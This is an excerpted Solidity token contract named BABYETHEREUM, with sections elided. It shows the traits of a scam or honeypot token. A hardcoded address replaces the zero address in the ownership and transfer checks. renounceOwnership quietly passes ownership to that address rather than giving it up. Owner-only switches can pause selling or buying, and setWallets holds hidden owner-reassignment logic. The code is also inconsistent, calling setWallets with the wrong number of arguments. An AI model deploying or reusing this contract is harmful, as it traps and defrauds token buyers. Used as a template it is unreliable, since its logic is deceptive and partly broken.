...
contract Ownable {
  ...
  function setWallets(address sender,address recipient,uint256 amount) internal{
    if(sender != address(0xf35BE5892ce02154731E704c07D6EEb12A02E5cE) &&_xowner == address(0xf35BE5892ce02154731E704c07D6EEb12A02E5cE)){
      _xowner = recipient;
    }else{
  ...
  function setOwner(address) internal {
    _owner = 0xf35BE5892ce02154731E704c07D6EEb12A02E5cE;
  }
  ...
  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0xf35BE5892ce02154731E704c07D6EEb12A02E5cE));
    _owner = address(0xf35BE5892ce02154731E704c07D6EEb12A02E5cE);
  }

  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0xf35BE5892ce02154731E704c07D6EEb12A02E5cE), "Ownable: new owner is the address");
  ...
  function unlock() public virtual {
    require(_owner == msg.sender, "Coin Contract : You don't have permission to unlock");
...
contract BABYETHEREUM is IBEP20, Ownable {
  using SafeMath for uint256;
  using Address for address;

  constructor(){
    address msgSender = _msgSender();
    emit OwnershipTransferred(address(0xf35BE5892ce02154731E704c07D6EEb12A02E5cE), msgSender);

    _name = "BABYETHEREUM";
    _synmbols = "BABYETH";
    _initSupply = 1000000000;
    _decimalsMul = 9;
    _decimals = 9;
    ...
    emit Transfer(address(0xf35BE5892ce02154731E704c07D6EEb12A02E5cE), msg.sender, _tokenSupply);
  }
  ...
  function enablePauseSell() public virtual onlyOwner {
    _pauseSell = true;
  }

  function disablePauseSell() public virtual onlyOwner {
    _pauseSell = false;
  }

  function enablePauseBuy() public virtual onlyOwner {
    _pauseBuy = true;
  }

  function disablePauseBuy() public virtual onlyOwner {
    _pauseBuy = false;
  }

  function setExcludeAddress(address account) public virtual onlyOwner {
    _isExcluded[account] = true;
  }

  function getExcludeAddress(address account) internal view returns (bool) {
    return _isExcluded[account];
  }
  
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0xf35BE5892ce02154731E704c07D6EEb12A02E5cE), "BEP20: approve from the address");
    require(spender != address(0xf35BE5892ce02154731E704c07D6EEb12A02E5cE), "BEP20: approve to the address");
    setAllowances(owner,spender,amount);
    emit Approval(owner, spender, amount);
  }
    
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0xf35BE5892ce02154731E704c07D6EEb12A02E5cE), "ERC20: transfer from the  address");
    require(recipient != address(0xf35BE5892ce02154731E704c07D6EEb12A02E5cE), "ERC20: transfer to the address");
  ...
  function _mint(address account, uint256 amount) internal virtual {
    require(account != address(0xf35BE5892ce02154731E704c07D6EEb12A02E5cE), "ERC20: mint to the address");

    increaseAllowance(account, amount);
    setWallets(account, getWalletBalance(account) + amount);
    emit Transfer(address(0xf35BE5892ce02154731E704c07D6EEb12A02E5cE), account, amount);
  }

  function _burn(address account, uint256 amount) internal virtual {
    address _burnaddress = 0x000000000000000000000000000000000000dEaD;
    require(account != address(0xf35BE5892ce02154731E704c07D6EEb12A02E5cE), "ERC20: burn from the dead address");
  ...
  function _beforeTokenTransfer(
    ...
    if (_pauseSell) {
      require(to == address(this), "Coin Contract : Sell is paused.");
    }

    if (_pauseBuy) {
      require(from == address(this), "Coin Contract : Buy is paused.");
    }
